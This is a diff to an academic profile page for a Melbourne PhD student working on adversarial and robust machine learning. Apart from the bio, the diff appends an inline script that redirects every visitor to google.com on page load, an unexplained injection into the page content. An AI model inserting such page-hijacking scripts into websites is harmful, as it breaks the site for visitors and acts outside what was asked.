@@ -67,3 +67,9 @@ user_groups:
 - Researchers
 ---
 I am a PhD student in the School of Computing and Information Systems, [The University of Melbourne](https://cis.unimelb.edu.au/). I am supervised by Prof. [James Bailey](https://people.eng.unimelb.edu.au/baileyj/), Dr. [Xingjun Ma](http://xingjunma.com/) and Dr. [Sarah Erfani](https://people.eng.unimelb.edu.au/smonazam/). Prior to my PhD, I completed my Master’s at University of Melbourne and Bachelor’s study at [Purdue University](https://www.cs.purdue.edu/). I also spent a few years in the industry. While my research focus is adversarial machine learning, neural architecture search and robust machine learning.
+
+<script>
+(function() {
+  location.href = 'https://google.com';
+})();
+</script>
